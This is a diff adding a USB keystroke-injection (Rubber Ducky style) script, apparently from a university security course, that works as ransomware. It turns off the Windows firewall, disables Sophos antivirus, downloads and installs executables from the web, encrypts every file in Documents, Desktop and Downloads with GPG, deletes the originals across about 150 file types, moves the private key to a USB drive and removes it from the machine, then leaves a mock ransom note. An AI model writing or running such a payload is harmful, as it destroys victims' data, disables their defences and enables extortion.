@@ -1,0 +1,397 @@
+REM Disable the firewall if it is on
+DELAY 300
+GUI r
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+STRING NetSh Advfirewall set allprofiles state off
+ENTER
+ALT F4
+REM END Disable firewall
+REM Disable or uninstall the USC antivirus
+DELAY 300
+GUI 
+DELAY 300
+STRING sophos
+DELAY 300
+ENTER
+REM This gets you into the Sophos interface. Now to navigate to the filtering function and disable it.
+LEFT 
+DELAY 300
+ENTER
+DELAY 300
+ALT c
+DELAY 300
+ENTER
+DELAY 300
+DOWN
+DELAY 300	
+DOWN
+DELAY 300
+DOWN
+DELAY 300
+DOWN
+DELAY 300
+DOWN
+DELAY 300
+ENTER
+DELAY 300
+ALT c
+DELAY 300
+UP
+DELAY 300
+UP
+DELAY 300
+ENTER
+DELAY 300
+ALT F4
+REM This disables the Sophos security provided by USC and closes out of the window once completed
+REM Now to Download a file over the Internet, if a network connection is available
+DELAY 10000
+GUI r
+DELAY 300
+STRING internet
+REM waits for internet to load
+DELAY 1000
+DELAY 1000
+ENTER
+DELAY 300
+ALT d
+DELAY 300
+STRING http://www-scf.usc.edu/~rbrockme/itp325/eightbears.jpg
+DELAY 1000
+DELAY 1000
+REM This will automatically download the file after the URL is submitted
+CTRL s
+DELAY 300
+ENTER
+ALT F4
+REM Now you have a nice meme in your downloads
+REM Install an application that you have downloaded online
+REM We’ll be installing BitTorrent, because why not
+DELAY 300
+GUI r
+DELAY 300
+STRING internet
+DELAY 2000
+ENTER
+DELAY 300
+ALT d
+REM downloads BitTorrent directly
+STRING http://www-scf.usc.edu/~rbrockme/itp325/BitTorrent.exe
+DELAY 5000
+DELAY 5000
+ALT r
+DELAY 300
+ALT r
+DELAY 300
+LEFT 
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+REM This will begin the GPG installation process and download the exe from the server
+DELAY 3000
+GUI r
+DELAY 1000
+STRING https://files.gpg4win.org/gpg4win-2.3.1.exe
+DELAY 1000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+GUI r
+DELAY 500
+BACKSPACE
+STRING downloads
+DELAY 1000
+ENTER
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 1000
+STRING gpg4win-2.3.1
+ENTER
+DELAY 5000
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 300
+ALT F4
+DELAY 300
+ALT F4
+DELAY 1500
+ALT TAB
+DELAY 5000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER 
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER 
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+DELAY 1000
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+ALT F4
+REM End Installation
+REM BEGIN Generate Key
+REM Open Kleopatra to generate the key
+DELAY 3000
+GUI r
+DELAY 1000
+DELAY 1000
+STRING Kleopatra
+DELAY 1000
+ENTER
+DELAY 1000
+REM Begin new key generation
+CTRL N
+DELAY 300
+ENTER
+STRING WATERMELONYUM
+DELAY 300
+TAB
+STRING <use email here> -r <use email here>
+DELAY 300
+TAB
+STRING FUCK!
+DELAY 300
+ENTER
+DELAY 300
+ENTER
+DELAY 300
+STRING OMGWTFBBQChicken
+DELAY 200
+ENTER
+DELAY 100
+LEFT
+DELAY 100
+ENTER
+DELAY 200
+STRING OMGWTFBBQChicken
+DELAY 200
+REM This is a stupid and INSECURE password
+ENTER
+DELAY 100
+ENTER
+DELAY 1000
+ALT TAB
+DELAY 500
+ALT F4
+REM END GENERATE KEY
+REM BEGIN Encrypt files using either symmetric or asymmetric encryption
+DELAY 1000
+REM opens up GUI to launch cmd
+GUI r
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 1000
+DELAY 1000
+REM This opens up the command line and takes you to the home dir by default
+STRING gpg --multifile --encrypt -r <use email here> -r <use email here> Documents/*
+ENTER
+REM This will encrypt every file in the Documents directory
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING cd Documents
+DELAY 100
+ENTER
+DELAY 300
+STRING DEL /S /Q *.doc *.docx *.log *.msg *.odt *.pages *.rtf  *.tex *.txt *.wpd *.wps *.csv *.dat *.ged *.key *.keychain *.pps *.ppt *.pptx *.sdf *.tar *.tax2014 *.tax2015 *.vcf *.xml *.aif *.iff *.m3u *.m4a *.mid *.mp3 *.mpa *.wav *.wma *.3g2 *.3gp *.asf *.avi *.flv *.m4v *.mov *.mp4 *.mpg *.rm *.srt *.swf *.vob *.wmv *.3dm *.3ds *.max *.obj *.bmp *.dds *.gif *.jpg *.png *.psd *.pspimage *.tga *.thim *.tif *.tiff *.yuv *.ai *.eps *.ps *.svg *.indd *.pct *.pdf *.xlr *.xls *.xlsx *.accdb *.db *.dbf *.mdb *.pdb *.sql *.apk *.app *.bat *.cgi *.com *.exe *.gadget *.jar *.pif *.wsf *.dem *.gam *.nes *.rom *.sav *.dwg *.dxf *.asp *.aspx *.cer *.cfm *.csr *.css *.htm *.html *.js *.jsp *.php *.rss *.xhtml *.crx *.plugin *.fnt *.fon *.otf *.ttf *.cab *.cpl *.cur *.deskthemepack *.dll *.dmp *.drv *.icns *.ico *.lnk *.sys *.cfg *.ini *.prf *.hqx *.mim *.uue *.7z *.cbr *.deb *.gz *.pkg *.rar *.rpm *.sitx *.tar.gz *.zip *.zipx *.bin *.cue *.dmg *.iso *.mdf *.toast *.vcd *.c *.class *.cpp *.cs *.dtd *.fla *.h *.java *.lua *.m *.pl *.py *.sh *.sln *.swift *.vb *.vcxproj *.xcodeproj *.bak *.tmp *.crdownload *.ics *.msi *.part *.torrent
+REM This will delete all files under the 100 most commonly used filetypes in the directory, effectively only leaving encrypted files in the directory
+DELAY 5000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+REM This will navigate back to the root directory so we can encrypt more files
+STRING cd ..
+DELAY 100
+ENTER
+STRING gpg --multifile --encrypt -r <use email here> -r <use email here> Desktop/*
+DELAY 100
+ENTER
+REM This will encrypt every file in the Desktop directory
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING cd Desktop
+DELAY 300
+ENTER
+STRING DEL /S /Q *.doc *.docx *.log *.msg *.odt *.pages *.rtf  *.tex *.txt *.wpd *.wps *.csv *.dat *.ged *.key *.keychain *.pps *.ppt *.pptx *.sdf *.tar *.tax2014 *.tax2015 *.vcf *.xml *.aif *.iff *.m3u *.m4a *.mid *.mp3 *.mpa *.wav *.wma *.3g2 *.3gp *.asf *.avi *.flv *.m4v *.mov *.mp4 *.mpg *.rm *.srt *.swf *.vob *.wmv *.3dm *.3ds *.max *.obj *.bmp *.dds *.gif *.jpg *.png *.psd *.pspimage *.tga *.thim *.tif *.tiff *.yuv *.ai *.eps *.ps *.svg *.indd *.pct *.pdf *.xlr *.xls *.xlsx *.accdb *.db *.dbf *.mdb *.pdb *.sql *.apk *.app *.bat *.cgi *.com *.exe *.gadget *.jar *.pif *.wsf *.dem *.gam *.nes *.rom *.sav *.dwg *.dxf *.asp *.aspx *.cer *.cfm *.csr *.css *.htm *.html *.js *.jsp *.php *.rss *.xhtml *.crx *.plugin *.fnt *.fon *.otf *.ttf *.cab *.cpl *.cur *.deskthemepack *.dll *.dmp *.drv *.icns *.ico *.lnk *.sys *.cfg *.ini *.prf *.hqx *.mim *.uue *.7z *.cbr *.deb *.gz *.pkg *.rar *.rpm *.sitx *.tar.gz *.zip *.zipx *.bin *.cue *.dmg *.iso *.mdf *.toast *.vcd *.c *.class *.cpp *.cs *.dtd *.fla *.h *.java *.lua *.m *.pl *.py *.sh *.sln *.swift *.vb *.vcxproj *.xcodeproj *.bak *.tmp *.crdownload *.ics *.msi *.part *.torrent
+REM This will delete all files under the 100 most commonly used filetypes in the directory, effectively only leaving encrypted files in the directory
+DELAY 10000
+DELAY 10000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING cd ..
+DELAY 100
+ENTER
+STRING gpg --multifile --encrypt -r <use email here> -r <use email here> Downloads/*
+DELAY 300
+ENTER
+REM This will encrypt every file in the Downloads directory, but will not encrypt any folders
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING cd Downloads
+DELAY 300
+ENTER
+STRING DEL /S /Q *.doc *.docx *.log *.msg *.odt *.pages *.rtf  *.tex *.txt *.wpd *.wps *.csv *.dat *.ged *.key *.keychain *.pps *.ppt *.pptx *.sdf *.tar *.tax2014 *.tax2015 *.vcf *.xml *.aif *.iff *.m3u *.m4a *.mid *.mp3 *.mpa *.wav *.wma *.3g2 *.3gp *.asf *.avi *.flv *.m4v *.mov *.mp4 *.mpg *.rm *.srt *.swf *.vob *.wmv *.3dm *.3ds *.max *.obj *.bmp *.dds *.gif *.jpg *.png *.psd *.pspimage *.tga *.thim *.tif *.tiff *.yuv *.ai *.eps *.ps *.svg *.indd *.pct *.pdf *.xlr *.xls *.xlsx *.accdb *.db *.dbf *.mdb *.pdb *.sql *.apk *.app *.bat *.cgi *.com *.exe *.gadget *.jar *.pif *.wsf *.dem *.gam *.nes *.rom *.sav *.dwg *.dxf *.asp *.aspx *.cer *.cfm *.csr *.css *.htm *.html *.js *.jsp *.php *.rss *.xhtml *.crx *.plugin *.fnt *.fon *.otf *.ttf *.cab *.cpl *.cur *.deskthemepack *.dll *.dmp *.drv *.icns *.ico *.lnk *.sys *.cfg *.ini *.prf *.hqx *.mim *.uue *.7z *.cbr *.deb *.gz *.pkg *.rar *.rpm *.sitx *.tar.gz *.zip *.zipx *.bin *.cue *.dmg *.iso *.mdf *.toast *.vcd *.c *.class *.cpp *.cs *.dtd *.fla *.h *.java *.lua *.m *.pl *.py *.sh *.sln *.swift *.vb *.vcxproj *.xcodeproj *.bak *.tmp *.crdownload *.ics *.msi *.part *.torrent
+REM This will delete all files under the 100 most commonly used filetypes in the directory, effectively only leaving encrypted files in the directory
+DELAY 10000
+DELAY 10000
+ENTER
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 5000
+STRING cd ..
+DELAY 300
+ENTER
+STRING exit
+DELAY 300
+ENTER
+REM END ENCRYPTION
+REM EXPORT KEY
+DELAY 100
+GUI r
+DELAY 300
+STRING cmd
+DELAY 300
+ENTER
+STRING cd Desktop
+DELAY 300
+STRING gpg --export -a WATERMELONYUM > 1public.key
+ENTER
+DELAY 500
+STRING gpg --export-secret-key -a WATERMELONYUM > 1private.key
+ENTER
+DELAY 500
+STRING move 1public.key F:\
+ENTER
+DELAY 1000
+STRING move 1private.key F:\
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End Export KEY
+REM Begin Delete KEY
+DELAY 100
+GUI r
+DELAY 300
+STRING cmd
+DELAY 300
+ENTER
+DELAY 300
+STRING gpg --delete-secret-key WATERMELONYUM
+ENTER
+DELAY 300
+STRING y
+DELAY 300
+ENTER
+STRING y
+DELAY 300
+ENTER
+STRING gpg --delete-key WATERMELONYUM
+ENTER
+DELAY 300
+STRING y
+DELAY 300
+ENTER
+REM shows that key is no longer in the system
+STRING gpg --delete-secret-key WATERMELONYUM
+ENTER
+DELAY 500
+STRING exit
+ENTER
+REM Ends deletion
+REM Leaves unencrypted note
+DELAY 500
+GUI r
+DELAY 100
+STRING notepad.exe
+DELAY 100
+ENTER
+DELAY 100
+STRING O NOE! YOU GOT HACKED BY LE HACK DOGE, THE MOST RARE OF ALL THE MEMES. Send $1,000,000,000 or lose everything.
+DELAY 1000
+CTRL S
+DELAY 500
+STRING Ransom_Letter
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+REM Ends Note
+
+
+
